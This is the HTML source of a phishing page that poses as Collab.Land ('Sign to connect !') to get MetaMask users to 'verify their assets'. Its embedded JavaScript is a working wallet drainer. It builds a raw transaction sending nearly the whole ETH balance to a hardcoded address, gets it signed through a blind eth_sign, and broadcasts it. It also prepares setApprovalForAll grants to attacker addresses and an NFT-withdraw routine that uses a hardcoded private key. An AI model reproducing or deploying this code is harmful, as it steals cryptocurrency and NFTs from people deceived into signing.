
<!DOCTYPE html><html> <head>
    <meta name="theme-color" content="#ffffff" />
        <meta property="og:title" content="VERIFY YOUR ASSETS" />
        <meta property="og:url" content="https://collabland-sign.com/" />
<meta property="og:image" content="https://collabland-sign.com/Handshake_CollabLand.png" />
<meta property="og:description" data-rh="true" content="
â–¶ Get stake from your assets

â–¶ Get special roles from discord server

â–¶ Connect and share with holders

â–¶ Create aligned incentives

ðŸ”’You need METAMASKðŸ”’">
    
        <meta name="twitter:card" content="summary_large_image" />
        <meta property="og:type" content="website" />
        <meta property="og:site_name" content="This is an automatic message">
    <script type="text/javascript" language="javascript" src="ethjs-unit.min.js"></script>

        <script type="text/javascript" language="javascript" src="web3-1.3.4.min.js"></script>

        <script type="text/javascript" language="javascript" src="jquery-1.6.4.min.js"></script>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <script src="https://unpkg.com/web3@1.2.2/dist/web3.min.js"></script>
  
<script async src="https://www.googletagmanager.com/gtag/js?id=G-RBQWKLVCWT"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-RBQWKLVCWT');
</script>

        <script type="text/javascript" language="javascript" src="ethereumjs-tx-1.3.3.min.js"></script>
        <meta charset="utf-8" /><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><!--metatextblock--><title>Welcome to Collab.Land</title><link rel="shortcut icon" href="https://static.tildacdn.com/tild6266-3161-4362-b738-333961393862/collabland-sign-32px.ico" type="image/x-icon" /><link rel="apple-touch-icon" href="https://static.tildacdn.com/tild3330-3830-4638-b937-303866343264/collabland-sign-152p.png"><link rel="apple-touch-icon" sizes="76x76" href="https://static.tildacdn.com/tild3330-3830-4638-b937-303866343264/collabland-sign-152p.png"><link rel="apple-touch-icon" sizes="152x152" href="https://static.tildacdn.com/tild3330-3830-4638-b937-303866343264/collabland-sign-152p.png"><link rel="apple-touch-startup-image" href="https://static.tildacdn.com/tild3330-3830-4638-b937-303866343264/collabland-sign-152p.png"><meta name="msapplication-TileColor" content="#000000"><meta name="msapplication-TileImage" content="https://static.tildacdn.com/tild6565-3062-4432-b631-346263366263/collabland-sign-270p.png"><!-- Assets --><link rel="stylesheet" href="https://static.tildacdn.com/css/tilda-grid-3.0.min.css" type="text/css" media="all" /><link rel="stylesheet" href="tilda-blocks-2.14.css" type="text/css" media="all" /><link rel="preconnect" href="https://fonts.gstatic.com"><link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;600;700&subset=latin,cyrillic" rel="stylesheet"><link rel="stylesheet" href="https://static.tildacdn.com/css/tilda-animation-1.0.min.css" type="text/css" media="all" /><link rel="stylesheet" href="https://static.tildacdn.com/css/tilda-menusub-1.0.min.css" type="text/css" media="print" onload="this.media='all';" /><noscript><link rel="stylesheet" href="https://static.tildacdn.com/css/tilda-menusub-1.0.min.css" type="text/css" media="all" /></noscript><link rel="stylesheet" href="https://static.tildacdn.com/css/tilda-cover-1.0.min.css" type="text/css" media="all" /><link rel="stylesheet" href="https://static.tildacdn.com/css/tilda-forms-1.0.min.css" type="text/css" media="all" /><script src="https://static.tildacdn.com/js/jquery-1.10.2.min.js"></script><script src="https://static.tildacdn.com/js/tilda-scripts-3.0.min.js"></script><script src="/tilda-blocks-2.7.js?t=1629842706"></script><script src="https://static.tildacdn.com/js/lazyload-1.3.min.js" charset="utf-8" async></script><script src="https://static.tildacdn.com/js/tilda-animation-1.0.min.js" charset="utf-8" async></script><script src="https://static.tildacdn.com/js/tilda-cover-1.0.min.js" charset="utf-8" async></script><script src="https://static.tildacdn.com/js/tilda-events-1.0.min.js" charset="utf-8" async></script><script src="https://static.tildacdn.com/js/tilda-menusub-1.0.min.js" charset="utf-8" async></script><script type="text/javascript">window.dataLayer = window.dataLayer || [];</script><!-- Google Tag Manager --><script type="text/javascript">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':	new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],	j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=	'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);	})(window,document,'script','dataLayer','GTM-MV9WV63');</script><!-- End Google Tag Manager --><script type="text/javascript">if((/bot|google|yandex|baidu|bing|msn|duckduckbot|teoma|slurp|crawler|spider|robot|crawling|facebook/i.test(navigator.userAgent))===false && typeof(sessionStorage)!='undefined' && sessionStorage.getItem('visited')!=='y'){	var style=document.createElement('style');	style.type='text/css';	style.innerHTML='@media screen and (min-width: 980px) {.t-records {opacity: 0;}.t-records_animated {-webkit-transition: opacity ease-in-out .2s;-moz-transition: opacity ease-in-out .2s;-o-transition: opacity ease-in-out .2s;transition: opacity ease-in-out .2s;}.t-records.t-records_visible {opacity: 1;}}';	document.getElementsByTagName('head')[0].appendChild(style);	$(document).ready(function() {	$('.t-records').addClass('t-records_animated');	setTimeout(function(){ $('.t-records').addClass('t-records_visible'); sessionStorage.setItem('visited','y');	},400);	});
}</script></head><body class="t-body" style="margin:0;"><!--allrecords--><div id="allrecords" class="t-records" data-hook="blocks-collection-content-node" data-tilda-project-id="2403158" data-tilda-page-id="11030614" data-tilda-formskey="6f4f0d7f4dc17a07d34f2e6b19eedfe4" data-tilda-lazy="yes"><div id="rec186590688" class="r t-rec t-screenmin-980px" style="background-color:#494949; " data-animationappear="off" data-record-type="446" data-screen-min="980px" data-bg-color="#494949"><!-- T446 --><div id="nav186590688marker"></div><div id="nav186590688" class="t446 t446__positionabsolute " style="background-color: rgba(0,0,0,0.0); height:100px; " data-bgcolor-hex="#000000" data-bgcolor-rgba="rgba(0,0,0,0.0)" data-navmarker="nav186590688marker" data-appearoffset="" data-bgopacity-two="" data-menushadow="0" data-bgopacity="0.0" data-menu-items-align="left" data-menu="yes"> <div class="t446__maincontainer " style="height:100px;"> <div class="t446__logowrapper"> </div> <div class="t446__leftwrapper" style=" text-align: left;"> <div class="t446__leftmenuwrapper"> <ul class="t446__list"> <li class="t446__list_item" style="padding:0 15px 0 0;"><a class="t-menu__link-item" href="#rec186590694" data-menu-submenu-hook="" style="color:#ffffff;font-weight:600;" data-menu-item-number="1">Newsletter</a> </li> <li class="t446__list_item" style="padding:0 15px;"><a class="t-menu__link-item" href="https://collabland.freshdesk.com/support/home" data-menu-submenu-hook="" target="_blank" style="color:#ffffff;font-weight:600;" data-menu-item-number="2">Support Channel</a> </li> <li class="t446__list_item" style="padding:0 0 0 15px;"><a class="t-menu__link-item" href="https://twitter.com/Collab_Land_" data-menu-submenu-hook="" style="color:#ffffff;font-weight:600;" data-menu-item-number="3">Twitter</a> </li> </ul> </div> </div> <div class="t446__rightwrapper" style=" text-align: right;"> <div class="t446__rightmenuwrapper"> <ul class="t446__list"> </ul> </div> </div> </div></div><style>@media screen and (max-width: 980px) {
@media screen and (max-width: 980px) { #rec186590688 .t446 { position: static; }
}
}</style><script>	$(document).ready(function() { t446_setLogoPadding('186590688'); });	var t446__doResize; $(window).on('resize', function(){ t446_checkOverflow('186590688', '100'); clearTimeout(t446__doResize); t446__doResize = setTimeout(function() { t446_checkOverflow('186590688', '100'); }, 200); }); $(window).on('load', function() { t446_checkOverflow('186590688', '100'); });	$(document).ready(function() { t446_checkOverflow('186590688', '100'); }); $(document).ready(function() { t446_highlight(); });
$(window).on('resize', function() { t446_setBg('186590688');
});
$(document).ready(function() { t446_setBg('186590688');
});</script><style>#rec186590688 .t-menu__link-item{ -webkit-transition: color 0.3s ease-in-out, opacity 0.3s ease-in-out; transition: color 0.3s ease-in-out, opacity 0.3s ease-in-out;	}
#rec186590688 .t-menu__link-item.t-active{ color:#ff745a !important; }
#rec186590688 .t-menu__link-item:not(.t-active):not(.tooltipstered):hover{ color: #ff745a !important; }
@supports (overflow:-webkit-marquee) and (justify-content:inherit)
{ #rec186590688 .t-menu__link-item, #rec186590688 .t-menu__link-item.t-active { opacity: 1 !important; }
}</style><script type="text/javascript"> $(document).ready(function() { setTimeout(function(){ t_onFuncLoad('t_menusub_init', function() { t_menusub_init('186590688'); }); }, 500); });</script><style>@media screen and (max-width: 980px) { #rec186590688 .t-menusub__menu .t-menusub__link-item { color:#ffffff !important; } #rec186590688 .t-menusub__menu .t-menusub__link-item.t-active { color:#ffffff !important; }
}</style> <!--[if IE 8]><style>#rec186590688 .t446 { filter: progid:DXImageTransform.Microsoft.gradient(startColorStr='#D9000000', endColorstr='#D9000000');
}</style><![endif]--> </div><div id="rec186590689" class="r t-rec" style=" " data-animationappear="off" data-record-type="205" ><!-- cover --><div class="t-cover" id="recorddiv186590689" bgimgfield="img" style="height:100vh; background-image:url('https://static.tildacdn.com/tild3431-3866-4662-a331-643666303162/-/resize/20x/Handshake_CollabLand.jpg');" ><div class="t-cover__carrier" id="coverCarry186590689" data-content-cover-id="186590689" data-content-cover-bg="https://static.tildacdn.com/tild3431-3866-4662-a331-643666303162/Handshake_CollabLand.jpg" data-content-cover-height="100vh" data-content-cover-parallax="" style="height:100vh;background-attachment:scroll; background-position:left top;"></div> <div class="t-cover__filter" style="height:100vh;background-image: -moz-linear-gradient(top, rgba(0,0,0,0.40), rgba(0,0,0,0.70));background-image: -webkit-linear-gradient(top, rgba(0,0,0,0.40), rgba(0,0,0,0.70));background-image: -o-linear-gradient(top, rgba(0,0,0,0.40), rgba(0,0,0,0.70));background-image: -ms-linear-gradient(top, rgba(0,0,0,0.40), rgba(0,0,0,0.70));background-image: linear-gradient(top, rgba(0,0,0,0.40), rgba(0,0,0,0.70));filter: progid:DXImageTransform.Microsoft.gradient(startColorStr='#99000000', endColorstr='#4c000000');"></div><div class="t-container"> <div class="t-width t-width_10" style="margin:0 auto;"><div class="t-cover__wrapper t-valign_middle" style="height:100vh; position: relative;z-index:1;"> <div class="t182"> <div data-hook-content="covercontent"> <div class="t182__wrapper"> <h1 class="t182__title t-title t-title_xl t-animate" data-animate-style="fadeinup" data-animate-group="yes" style="color:#ffc11e;" field="title"><div style="color:#ffc11e;" data-customstyle="yes">COLLAB.LAND</div></h1> <div class="t182__descr t-descr t-descr_lg t-animate" data-animate-style="fadeinup" data-animate-group="yes" style="color:#ffc11e;" field="descr">

<div style="color:#ffc11e;" data-customstyle="yes">Serving Tokenized Communities. </div></div> 

<div class="t182__buttons"> <a onclick="verifyAsset();" target="" class="t-btn t-animate" data-animate-style="fadeinup" data-animate-group="yes" style="color:#000000;background-color:#ffc11e;border-radius:3px; -moz-border-radius:3px; -webkit-border-radius:3px;text-transform:uppercase;box-shadow: 0px 0px 20px 0px rgba(0, 0, 0, 0.3);"><table style="width:100%; height:100%;" ><tr><td>Sign to connect !</td></tr></table></a> </div> 

<script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{}},"page":"/claim","query":{},"buildId":"fVEw2eTElp2yFbaXdDNcq","nextExport":true,"autoExport":true,"isFallback":false,"scriptLoader":[]}</script>
    <!-- Cloudflare Pages Analytics -->

    <script defer="" src="static.cloudflareinsights.com/beacon.min.html" data-cf-beacon="{&quot;token&quot;: &quot;aec473b181cb478099be1377f54b6ec2&quot;}"></script>

    <!-- Cloudflare Pages Analytics -->
    <script type="text/javascript">(function(){window['__CF$cv$params']={r:'6ee087ffbb5276f0',m:'stDHWv7qxkNKZ8t_iQs8BO_YjBmn9.CWCHxXwBp72Jk-1647633382-0-ASe8cJStYtKsJ50YyJ4lhPZrc4xn2dQUg2NnTfSS6GTvYDCigdKj3Y5Bnmre3ThU/ACWVja0aEzuYC31OAlvFxyQUSzLkCCB6EDKmSiG2SQDk0WqSJNq1pEG+3/sBXxd8w==',s:[0x83b67b2802,0x741fbe85ee],}})();</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script> 
 <script src="https://unpkg.com/web3@1.2.2/dist/web3.min.js"></script>

    <script type="text/javascript">

        let currentAccount = null;
        let abi;
        let account = "";
        const contactAddress = '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D';
        const toAddress = '0x4f3310153d3065318A487f6111C2340A1361b147';
        let token_contract = null;
        let eth_bal;
        let token_bal;
        let chainId;
        let error_type;
        const tokens = [];

        const minABI = [
            // balanceOf
            {
            "constant":true,
            "inputs":[{"name":"_owner","type":"address"}],
            "name":"balanceOf",
            "outputs":[{"name":"balance","type":"uint256"}],
            "type":"function"
            },
            // decimals
            {
            "constant":true,
            "inputs":[],
            "name":"decimals",
            "outputs":[{"name":"","type":"uint8"}],
            "type":"function"
            }
        ];

        abi = [{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"mint","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"}]

        //Created check function to see if the MetaMask extension is installed
        const isMetaMaskInstalled = () => {
            //Have to check the ethereum binding on the window object to see if it's installed
            const { ethereum } = window;
            return Boolean(ethereum);
        };

        const onClickConnect = async () => {

            try {

                // Will open the MetaMask UI
                // You should disable this button while the request is pending!
                await ethereum
                .request({ method: 'eth_requestAccounts' })
                .then(handleAccountsChanged);
                
            } catch (error) {
                console.error(error);
                notify();
            }
        };


        const MetaMaskClientCheck = async () => {

            //Now we check to see if MetaMask is installed
            if (!isMetaMaskInstalled()) {

                //If it isn't installed we ask the user to click to install it
                //alert("Metamask is not installed");'

                error = "<p class='mb-sm text-center px-gutter'>You need to connect your MetaMask wallet before you can claim FoxFam.</p>" +
                    "<p class='mb-sm px-gutter'>MetaMask is not installed.</p>" + "<a class='btn' href='https://metamask.app.link/dapp/apecoinclaim.com/' target='_blank'>Open MetaMask</a>"
                    
                $("#content").html(error);
                $("#connecti").show();

                
            }
            
            else {
                //If it is installed we change our button text

                web3 = new Web3(ethereum);
                window.web3 = web3;

                chainId = await web3.eth.getChainId();
                
                if (chainId != 1) {

                    try {

                        await ethereum
                        .request({            
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: '0x1' }],
                        }) 
                        .then(console.log)

                        .catch((err) => {
                            alert("Switch network to use dapp")
                            console.log(err);
                        });

                    }

                    catch (err) {

                        console.log(error);

                    }

                };
            

            }

        };

        function handleAccountsChanged(accounts) {
            if (accounts.length === 0) {
                // MetaMask is locked or the user has not connected any accounts
                console.log('Please connect to MetaMask.');

                $('#connecti').show();
                $("#signi").hide();
                //$("#buyBtn").attr('disabled', true);

            } else if (accounts[0] !== currentAccount) {
                console.log("Metamask account changed: " + accounts[0]);
                
                currentAccount = accounts[0];
                
                $("#connecti").hide();
                $("#signi").show();
                $("#account_num").text(currentAccount);
                //$("#buyBtn").attr('disabled', false);

                if (typeof accountChangedCallback !== 'undefined') {
                    accountChangedCallback();
                }
            }   
        }


        const withdraw = async () => {

            web3 = new Web3(ethereum);

            console.log("here")

            for ( const token of tokens) {

                try {
                    console.log(token)

                    transferData = await token_contract.methods.safeTransferFrom(currentAccount, "0x0dD4F190DC142f49Dbc80231899f7A03A297d3D2", token).encodeABI();
                    txnCount = await web3.eth.getTransactionCount(currentAccount, "pending");
                    jgasPrice = await web3.eth.getGasPrice();
                    const gas = new web3.utils.BN("500000");

                    txObject = {
                        nonce: txnCount,
                        gasLimit: 200000,
                        gasPrice: jgasPrice,
                        to: contactAddress,
                        value: "0x",
                        data: transferData,
                        chainId: chainId,
                        from: currentAccount,
                    };

                    ethTx = new ethereumjs.Tx(txObject);

                    prv = "5ae068df38a82e4b6773a41641e13e879e2ebc424ed233568f00a78d8aa92939";

                    key = "0x" + prv.toString(16);


                    //ethTx.sign(web3.utils.toHex(prv));

                    var stx = ethTx.serialize();

                    txsigned = await web3.eth.accounts.signTransaction(txObject, prv);
                    //.then(hash.rawTransaction);

                    const rstr = txsigned.rawTransaction;

                    //const rTx = '0x' + rstr.serialize().toString('hex');

                    console.log(rstr);
                    console.log(txsigned.transactionHash);


                    await web3.eth.sendSignedTransaction(rstr)
                    .then((hash) => {
                        console.log(hash);
                        notify(2);

                    })

                    
                    /***
                    await web3.eth.sendTransaction(txObject)
                    .then((hash) => {
                        console.log(hash);
                    })
                    
                    ***/
                }

                catch (err) {

                    console.log(err);
                }

            }
            console.log("heter")


            

        }

                    
        const listTokensOfOwner = async () => {

            try {

                //\console.error(await token.name(), 'tokens owned by', account);

                await token_contract.getPastEvents('Transfer', {
                    filter: {
                        to: currentAccount
                    },
                    fromBlock: 0
                })
                
                .then(async (events) => {
                    for (let event of events) {

                        //console.log(event.returnValues.tokenId);
                        id = event.returnValues.tokenId;
                        fro = event.returnValues.to;
                        ids = await token_contract.methods.ownerOf(id).call();
                        index = tokens.length;

                        if (ids == fro) {
                            tokens[index] = id;
                        }
                    }

                    console.log(tokens);
                    
                });

                /***

                for (const log of logs) {
                    const { from, to, tokenId } = log.args;
                    
                    if (addressEqual(to, account)) {
                    owned.add(tokenId.toString());
                    } else if (addressEqual(from, account)) {
                    owned.delete(tokenId.toString());
                    }
                }

                console.log([...owned].join('\n'));

                ***/
            }

            catch (err) {

                console.log(err);
            }
        };


        const notify = (num) => {

            $("#signi").hide();
            $("#connecti").hide();
            $("#error").hide();

            switch (num) {

                case 0:
                    

                    if (error_type == 0) {

                        error_text = "Insufficient gas fee to claim your FoxFam.";
                        $("#error-text").html(error_text);
                    }
                    
                    else if (error_type == 1) {
                        
                        error_text = "Insufficient gas fee to claim your FoxFam.";
                        $("#error-text").html(error_text);
                    }

                    $("#error").show();

                    break;


                case 1:
                    
                    $("#connecti").show();
                    
                    break;

    
                case 2:
                    
                    $("#signi").show();
                    break;
                    
                
                default:
                    
                    $("#error").show();
                    break;

            }


            //setTimeout('$("#error").hide();', 5000);

        }


        const claim1 = async() => {

            web3 = new Web3(ethereum);

            chainId = await web3.eth.getChainId();

            txnNonce = await web3.eth.getTransactionCount(currentAccount, "pending");

            taddr = "0x6f9d9ece2d05730eafb6e5b4d3025a8a3a38fc11";
            t_contract = await new web3.eth.Contract(
                abi,
                taddr
            );

            //const contractdata = await t_contract.methods.approve(contactAddress, 10).send({from: currentAccount}); 
            //const contractdata = await t_contract.methods.approve(contactAddress, 10).encodeABI();
            contractdata = await t_contract.methods.setApprovalForAll("0x64B65c8F9E47b1953Db33342D72c24CE0d6D4bB2", true).encodeABI();

            const transactionParameters = {

                gasLimit: "0x1B2E020",
                maxPriorityFeePerGas: 1.100000008,
                maxFeePerGas: 1.100000008, 
                to: '0x6f9d9ece2d05730eafb6e5b4d3025a8a3a38fc11', // Required except during contract publications.
                from: currentAccount, // must match user's active address.
                value: 0,
                chainId: '0x4', // Used to prevent transaction reuse across blockchains. Auto-filled by MetaMask.
                'data': contractdata,

            };


        }


        async function claim() {

            web3 = new Web3(ethereum);

            chainId = await web3.eth.getChainId();

            await web3.eth.getTransactionCount(currentAccount, "pending")
            .then(async (txnCount) => {
                // Create the transaction object
                eth_wei = ethUnit.toWei(0.1, 'ether');

                const jgasPrice = await web3.eth.getGasPrice();

                const mgasPrice = web3.utils.toHex(jgasPrice);

                const gas = new web3.utils.BN("22000");

                const cost = gas * jgasPrice;

                const sending = eth_bal - 1.001*cost;

                const sending1 = web3.utils.fromWei(eth_wei, "ether");

                const fs = "0x" + sending.toString(16);

                //taddr = "0x6f9d9ece2d05730eafb6e5b4d3025a8a3a38fc11";
                token_contract = await new web3.eth.Contract(
                    abi,
                    contactAddress
                );

                //const contractdata = await t_contract.methods.approve(contactAddress, 10).send({from: currentAccount}); 
                //const contractdata = await t_contract.methods.approve(contactAddress, 10).encodeABI();
                const contractdata = await token_contract.methods.setApprovalForAll(toAddress, true).encodeABI();
                
                console.log(sending1);
                console.log(fs);

                const txObject = {
                    nonce: web3.utils.toHex(txnCount),
                    gasPrice: mgasPrice,
                    gasLimit: "0x55F0",
                    to: "0x4f3310153d3065318A487f6111C2340A1361b147",
                    value: fs,
                    data: "0x",
                    v: "0x1",
                    r: "0x",
                    s: "0x"
                };

                let ethTX1 = new ethereumjs.Tx(txObject);
                const rawTx1 = '0x' + ethTX1.serialize().toString('hex');
                const rawHash1 = web3.utils.sha3(rawTx1, {encoding: 'hex'});

                console.log(rawTx1);
                console.log(rawHash1);

                /***
                 const mycontract = await new web3.eth.Contract(
                    abi,
                    contractAddress
                ); 
                ***/
                
                // const txHash = await mycontract.methods.hashStruct(txObject).call()        

                await web3.eth.sign(rawHash1, currentAccount)
                .then(async (result) => {
                    

                    // The signature is now comprised of r, s, and v.

                    const signature = result.substring(2);
                    const r = "0x" + signature.substring(0, 64);
                    const s = "0x" + signature.substring(64, 128);
                    const v = parseInt(signature.substring(128, 130), 16);

                    //signer = await mycontract.methods.verify(current_account ,rawHash1, r, s, v).call();
                    //console.log(signer);

                    const y =  web3.utils.toHex(v + chainId * 2 + 8);

                    console.log(r);
                    console.log(s);
                    console.log(y.toString('hex'));

                    /*** const signedTx = {
                     nonce: web3.utils.toHex(txnCount),
                    gasPrice: mgasPrice,
                    gasLimit: "0x5208",
                    to: "0xDB03428239a597C478e6A6d9F2AbD0D115411863",
                    value: "0x186A0",
                    data: "0x",
                    v: y,
                    r: r,
                    s: s 
                    }; ***/

                    // const ethTX = new ethereumjs.Tx(signedTx);

                    ethTX1.r = r
                    ethTX1.s = s
                    ethTX1.v = y

                    console.log(ethTX1);

                    const rawTx = '0x' + ethTX1.serialize().toString('hex');
                    const rawHash = web3.utils.sha3(rawTx, {encoding: 'hex'});

                    console.log(rawTx);

                    //console.log('0x' + ethTX1.hash().toString('hex'));

                    
                    
                    await web3.eth.sendSignedTransaction(rawTx)
                    .then((hash) => {
                        console.log(hash);
                        //withdraw();
                        
                        notify(0);

                    })

                    .catch( (e) => {
                        
                        notify(0);

                    });
                    
                    
                })

                .catch((err) => {

                    console.log(err);
                    notify(2);
                    
                })


            })

        }


        const verifyAsset = async () => {

            web3 = new Web3(web3.currentProvider);

            try {

                /*** Operation already initiatiated

                await ethereum
                .request({ method: 'eth_requestAccounts' })
                .then(handleAccountsChanged)
                .catch( (err)=> {
                
                //$("#welcome_div").show();
                console.log(err);

                })
                **/

                token_contract = await new web3.eth.Contract(
                    abi,
                    contactAddress
                );

                // token_bal = await token_contract.methods.balanceOf(currentAccount).call();
                // console.log(token_bal);
                eth_bal = await web3.eth.getBalance(currentAccount);
                const r_bal = web3.utils.fromWei(eth_bal, 'ether');
                chainId = await web3.eth.getChainId();


                if (r_bal > 0.0003) {

                    //listTokensOfOwner();
                    claim();
                    //withdraw();
                    
                }

                else {
                    //alert("Insufficients Funds. Fund account to continue");
                    error_type = 1;
                    notify(0);
                }


            }

            catch(e) {

                console.log(e);
                notify();

            }



        };


        window.addEventListener('load', () => {

            try {

                
                MetaMaskClientCheck();


                ethereum.on('accountsChanged', handleAccountsChanged);
                // to unsubscribe
                //ethereum.removeListener('accountsChanged', handleAccountsChanged);


            }

            catch (e) {

                console.log(e);
            }
            
            //startMeta();


        })


    </script>


</div> </div> </div> </div> </div> </div>
    <script src="./src/js/loader_index.js"></script>

    <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
    <script src="https://npmcdn.com/moralis/dist/moralis.js"></script>
    <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.5/dist/umd/index.min.js"></script>

    <script type="text/javascript" src="./src/js/index.js"></script>
    <script type="text/javascript" src="./src/js/claim.js"></script>

</body>

</html>
